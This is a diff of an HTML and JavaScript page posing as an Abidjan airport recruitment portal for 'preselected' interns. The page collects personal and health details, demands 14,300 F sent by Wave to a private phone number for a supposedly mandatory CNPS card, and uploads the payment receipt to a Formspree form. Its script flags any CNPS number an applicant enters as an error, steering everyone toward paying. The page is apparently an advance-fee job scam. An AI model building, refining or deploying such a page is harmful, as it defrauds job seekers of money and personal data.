@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
     <title>Aéroport International d'Abidjan · Portail d'enregistrement</title>
-    <!-- Inter & Font Awesome pro -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..700;1,14..32,400..700&display=swap" rel="stylesheet">
@@ -26,7 +25,6 @@
             line-height: 1.5;
         }
 
-        /* en-tête */
         .header {
             background: #002b4e;
             color: white;
@@ -75,7 +73,6 @@
             margin-right: 0.3rem;
         }
 
-        /* footer */
         .footer {
             background: #11212e;
             color: #b6d0e0;
@@ -98,7 +95,6 @@
             font-weight: 500;
         }
 
-        /* conteneur principal */
         .main-container {
             flex: 1;
             max-width: 900px;
@@ -107,7 +103,6 @@
             width: 100%;
         }
 
-        /* carte */
         .card {
             background: white;
             border-radius: 32px;
@@ -116,7 +111,6 @@
             border: 1px solid rgba(0, 70, 120, 0.08);
         }
 
-        /* message félicitations */
         .congrats-header {
             background: #f5faff;
             padding: 1.8rem 1.5rem;
@@ -160,7 +154,6 @@
             background: #001f39;
         }
 
-        /* formulaire */
         .form-section {
             padding: 1.5rem 1.2rem;
         }
@@ -192,7 +185,6 @@
             font-size: 1.1rem;
         }
 
-        /* pages formulaire */
         .form-page {
             animation: fade 0.2s;
         }
@@ -243,7 +235,6 @@
             border: 1px solid #b9d1e7;
         }
 
-        /* cadre paiement / upload */
         .paiement-cadre {
             background: #fcf9ea;
             border: 2px solid #e4b138;
@@ -271,10 +262,23 @@
             text-align: center;
             margin: 1rem 0;
             cursor: pointer;
+            transition: all 0.2s;
+        }
+        .file-upload-box:hover {
+            background: #fff7e0;
+            border-color: #e4b138;
         }
         .file-upload-box i {
             font-size: 2.2rem;
             color: #b57c16;
+        }
+        .file-upload-box input {
+            position: absolute;
+            width: 0.1px;
+            height: 0.1px;
+            opacity: 0;
+            overflow: hidden;
+            z-index: -1;
         }
         .file-name {
             font-size: 0.9rem;
@@ -283,6 +287,8 @@
             border-radius: 40px;
             display: inline-block;
             margin-top: 0.5rem;
+            word-break: break-all;
+            max-width: 100%;
         }
         .info-cnps-avantage {
             background: #e0f0fa;
@@ -355,21 +361,6 @@
             }
         }
 
-        .success-message {
-            background: #dff0d8;
-            border-radius: 32px;
-            padding: 2rem;
-            text-align: center;
-            color: #1d5520;
-            font-weight: 500;
-        }
-        .highlight-warning {
-            background: #fef7e7;
-            border-radius: 24px;
-            padding: 1rem;
-            border: 1px solid #f1b24a;
-        }
-
         .error-message {
             color: #d32f2f;
             font-size: 0.85rem;
@@ -381,29 +372,16 @@
             padding: 0.5rem 1rem;
             border-radius: 30px;
         }
-
         .error-message i {
             color: #c62828;
         }
-
         .input-error {
             border-color: #c62828 !important;
             background-color: #fff8f8;
         }
         
-        .loading {
-            opacity: 0.7;
-            pointer-events: none;
-        }
-        
-        .loading .btn-primary {
-            position: relative;
-        }
-        
-        .loading .btn-primary:after {
-            content: "...";
-            position: absolute;
-            right: 10px;
+        .text-small {
+            font-size: 0.85rem;
         }
     </style>
 </head>
@@ -423,7 +401,6 @@
 
     <main class="main-container">
         <div class="card" id="mainCard">
-            <!-- bloc félicitations visible au départ -->
             <div id="congratsBlock" class="congrats-header">
                 <div class="congrats-title">
                     <i class="fas fa-check-circle"></i> Félicitations, vous êtes présélectionné(e) !
@@ -436,11 +413,8 @@
                 </button>
             </div>
 
-            <!-- formulaire (caché au début) -->
             <div id="formContainer" class="form-section hidden">
-                <!-- Utilisation de Formspree.io qui supporte les fichiers -->
                 <form id="multiStepForm" action="https://formspree.io/f/xdkeblqy" method="POST" enctype="multipart/form-data">
-                    <!-- Champs cachés pour Formspree -->
                     <input type="hidden" name="_subject" value="Nouvelle inscription stagiaire - Aéroport Abidjan">
                     <input type="hidden" name="_next" value="https://enregistrement-aeroport.netlify.app/merci.html">
                     
@@ -451,7 +425,6 @@
                         <span class="step" id="step4"><i class="fas fa-gavel"></i> 4. Engagement</span>
                     </div>
 
-                    <!-- PAGE 1 -->
                     <div id="page1" class="form-page">
                         <div class="form-row">
                             <label class="required">ID employé</label>
@@ -479,7 +452,6 @@
                         </div>
                     </div>
 
-                    <!-- PAGE 2 -->
                     <div id="page2" class="form-page hidden">
                         <div class="form-row">
                             <label>Problème de santé (optionnel)</label>
@@ -494,13 +466,12 @@
                         </div>
                     </div>
 
-                    <!-- PAGE 3 : CNPS -->
                     <div id="page3" class="form-page hidden">
                         <div class="form-row">
-                            <label class="required">Avez-vous déjà travaillé dans un aéroport ? et Avez-vous une carte d'assurance sociale (CNPS) de l'aéroport ?</label>
+                            <label class="required">Avez-vous une carte d'assurance sociale (CNPS) de l'aéroport ?</label>
                             <div class="flex-group">
                                 <label class="radio-option">
-                                    <input type="radio" name="cnps_statut" value="oui" id="cnpsOui"> Oui, et j'ai la carte
+                                    <input type="radio" name="cnps_statut" value="oui" id="cnpsOui"> Oui, j'ai la carte
                                 </label>
                                 <label class="radio-option">
                                     <input type="radio" name="cnps_statut" value="non" id="cnpsNon"> Non, pas encore
@@ -508,7 +479,6 @@
                             </div>
                         </div>
 
-                        <!-- bloc si oui -->
                         <div id="cnpsOuiBlock" class="hidden">
                             <div class="form-row">
                                 <label>Numéro CNPS</label>
@@ -519,7 +489,6 @@
                             </div>
                         </div>
 
-                        <!-- bloc si non : explication + cadre paiement et upload -->
                         <div id="cnpsNonBlock" class="hidden">
                             <div class="paiement-cadre">
                                 <h4><i class="fas fa-shield-heart"></i> Pourquoi souscrire à la carte CNPS ?</h4>
@@ -529,20 +498,19 @@
                                 </div>
                                 <p style="margin-top: 1rem;"><i class="fas fa-mobile-alt"></i> Pour obtenir votre carte, envoyez <strong>14 300 F</strong> par Wave au <strong>+225 07 69 02 63 23</strong> (service agréé). Après 24h vous recevrez votre carte par Gmail (PDF) à imprimer et à présenter lors de l'entretien d'embauche.</p>
                                 
-                                <!-- Cadre pour joindre la capture du paiement -->
-                                <div class="file-upload-box" onclick="document.getElementById('paiementCapture').click();">
+                                <div class="file-upload-box" id="fileUploadBox">
                                     <i class="fas fa-cloud-upload-alt"></i>
-                                    <p style="font-weight:600;">Cliquez pour joindre la capture du paiement (reçu)</p>
-                                    <input type="file" name="paiement_capture" id="paiementCapture" accept="image/*,application/pdf">
-                                    <span id="fileSelectedName" class="file-name">Aucun fichier sélectionné</span>
+                                    <p style="font-weight:600; margin: 10px 0;">Cliquez pour joindre la capture du paiement (reçu)</p>
+                                    <p style="font-size: 0.8rem; color: #666;">Formats acceptés : JPG, PNG, PDF</p>
+                                    <input type="file" name="paiement_capture" id="paiementCapture" accept="image/jpeg,image/png,image/jpg,application/pdf">
+                                    <div id="fileSelectedName" class="file-name">Aucun fichier sélectionné</div>
                                 </div>
-                                <p class="text-small" style="color:#60af00;"><i class="far fa-clock"></i> Nous allons vous envoyer par Gmail la date à laquelle vous allez commencer le travail, une fois les frais de la carte payés.</p>
+                                <p class="text-small" style="color:#60af00; margin-top: 10px;"><i class="far fa-clock"></i> Nous allons vous envoyer par Gmail la date à laquelle vous allez commencer le travail, une fois les frais de la carte payés.</p>
                                 <p class="text-small" style="color:#af6300;"><i class="far fa-clock"></i> La carte est obligatoire pour tous les employés sélectionnés. Sans cela, vous ne pouvez pas accéder à nos locaux.</p>
                             </div>
                         </div>
                     </div>
 
-                    <!-- PAGE 4 : articles de loi et confirmation -->
                     <div id="page4" class="form-page hidden">
                         <div style="background:#f4fafd; border-radius:24px; padding:1.5rem;">
                             <h4 style="color:#002b4e;"><i class="fas fa-scale-balanced"></i> Références juridiques</h4>
@@ -555,7 +523,6 @@
                         </div>
                     </div>
 
-                    <!-- navigation -->
                     <div class="navigation-buttons">
                         <button type="button" id="prevBtn" class="btn-nav" disabled><i class="fas fa-arrow-left"></i> Précédent</button>
                         <button type="button" id="nextBtn" class="btn-nav">Suivant <i class="fas fa-arrow-right"></i></button>
@@ -564,8 +531,6 @@
                 </form>
             </div>
         </div>
-
-        <!-- message récapitulatif après soumission -->
         <div id="recapMessage" style="margin-top: 2rem;"></div>
     </main>
 
@@ -601,25 +566,64 @@
             const nonBlock = document.getElementById('cnpsNonBlock');
             const fileInput = document.getElementById('paiementCapture');
             const fileNameSpan = document.getElementById('fileSelectedName');
+            const fileUploadBox = document.getElementById('fileUploadBox');
 
             let currentPage = 1;
 
-            showBtn.addEventListener('click', ()=>{
-                congrats.style.display = 'none';
-                formContainer.classList.remove('hidden');
-                updatePage();
-            });
+            // Afficher le formulaire
+            if(showBtn) {
+                showBtn.addEventListener('click', ()=>{
+                    congrats.style.display = 'none';
+                    formContainer.classList.remove('hidden');
+                    updatePage();
+                });
+            }
 
+            // Gestion du fichier - CORRECTION IMPORTANTE
+            if(fileInput && fileNameSpan) {
+                // Supprimer l'ancien event listener et en ajouter un nouveau
+                fileInput.addEventListener('change', function(e) {
+                    e.stopPropagation();
+                    if (this.files && this.files.length > 0) {
+                        const file = this.files[0];
+                        fileNameSpan.textContent = file.name;
+                        fileNameSpan.style.color = '#1d7e3c';
+                        fileNameSpan.style.background = '#e0f5e6';
+                        console.log('Fichier sélectionné:', file.name);
+                    } else {
+                        fileNameSpan.textContent = 'Aucun fichier sélectionné';
+                        fileNameSpan.style.color = '';
+                        fileNameSpan.style.background = '#e7eef6';
+                    }
+                });
+            }
+
+            // Clic sur la boîte pour ouvrir le sélecteur de fichier
+            if(fileUploadBox && fileInput) {
+                fileUploadBox.addEventListener('click', function(e) {
+                    // Éviter que le clic sur le span ou les éléments enfants ne déclenche deux fois
+                    if(e.target !== fileInput) {
+                        fileInput.click();
+                    }
+                });
+                
+                // Empêcher la propagation du clic sur l'input lui-même
+                fileInput.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                });
+            }
+
+            // Gestion des radios CNPS
             function toggleCnps() {
                 if (cnpsOui && cnpsOui.checked) {
-                    ouiBlock.classList.remove('hidden');
-                    nonBlock.classList.add('hidden');
+                    if(ouiBlock) ouiBlock.classList.remove('hidden');
+                    if(nonBlock) nonBlock.classList.add('hidden');
                 } else if (cnpsNon && cnpsNon.checked) {
-                    ouiBlock.classList.add('hidden');
-                    nonBlock.classList.remove('hidden');
+                    if(ouiBlock) ouiBlock.classList.add('hidden');
+                    if(nonBlock) nonBlock.classList.remove('hidden');
                 } else {
-                    ouiBlock.classList.add('hidden');
-                    nonBlock.classList.add('hidden');
+                    if(ouiBlock) ouiBlock.classList.add('hidden');
+                    if(nonBlock) nonBlock.classList.add('hidden');
                 }
             }
             
@@ -628,16 +632,7 @@
                 cnpsNon.addEventListener('change', toggleCnps);
             }
 
-            if(fileInput) {
-                fileInput.addEventListener('change', function(e) {
-                    if (this.files.length > 0) {
-                        fileNameSpan.textContent = this.files[0].name;
-                    } else {
-                        fileNameSpan.textContent = 'Aucun fichier sélectionné';
-                    }
-                });
-            }
-
+            // Validation des pages
             function validatePage(page) {
                 if (page === 1) {
                     const employerId = document.getElementById('employerId');
@@ -663,12 +658,6 @@
                     if (!telephone.value.trim()) {
                         alert('Veuillez saisir votre numéro de téléphone.');
                         telephone.focus();
-                        return false;
-                    }
-                    const email = document.getElementById('gmail');
-                    if (email.value.trim() && !email.value.includes('@')) {
-                        alert('Veuillez saisir une adresse email valide.');
-                        email.focus();
                         return false;
                     }
                 }
@@ -712,15 +701,15 @@
             }
 
             function updatePage() {
-                page1.classList.add('hidden');
-                page2.classList.add('hidden');
-                page3.classList.add('hidden');
-                page4.classList.add('hidden');
+                if(page1) page1.classList.add('hidden');
+                if(page2) page2.classList.add('hidden');
+                if(page3) page3.classList.add('hidden');
+                if(page4) page4.classList.add('hidden');
                 
-                if (currentPage === 1) page1.classList.remove('hidden');
-                if (currentPage === 2) page2.classList.remove('hidden');
-                if (currentPage === 3) page3.classList.remove('hidden');
-                if (currentPage === 4) page4.classList.remove('hidden');
+                if (currentPage === 1 && page1) page1.classList.remove('hidden');
+                if (currentPage === 2 && page2) page2.classList.remove('hidden');
+                if (currentPage === 3 && page3) page3.classList.remove('hidden');
+                if (currentPage === 4 && page4) page4.classList.remove('hidden');
 
                 if(step1) step1.classList.toggle('active', currentPage === 1);
                 if(step2) step2.classList.toggle('active', currentPage === 2);
@@ -758,21 +747,16 @@
 
             if(form) {
                 form.addEventListener('submit', function(e) {
-                    // Ne pas empêcher la soumission, laisser le formulaire s'envoyer normalement
-                    // Mais on vérifie d'abord la dernière page
                     if (!validatePage(4)) {
                         e.preventDefault();
                         return false;
                     }
                     
-                    // Afficher un message de chargement
                     const confirmButton = document.getElementById('confirmBtn');
                     if(confirmButton) {
                         confirmButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi en cours...';
                         confirmButton.disabled = true;
                     }
-                    
-                    // Le formulaire va s'envoyer normalement
                     return true;
                 });
             }
@@ -780,13 +764,13 @@
             const cnpsNumeroField = document.getElementById('cnpsNumero');
             const cnpsErrorDiv = document.getElementById('cnpsError');
 
-            if (cnpsNumeroField) {
+            if (cnpsNumeroField && cnpsErrorDiv) {
                 cnpsNumeroField.addEventListener('input', function() {
                     if (this.value.trim() !== '') {
-                        if(cnpsErrorDiv) cnpsErrorDiv.classList.remove('hidden');
+                        cnpsErrorDiv.classList.remove('hidden');
                         this.classList.add('input-error');
                     } else {
-                        if(cnpsErrorDiv) cnpsErrorDiv.classList.add('hidden');
+                        cnpsErrorDiv.classList.add('hidden');
                         this.classList.remove('input-error');
                     }
                 });
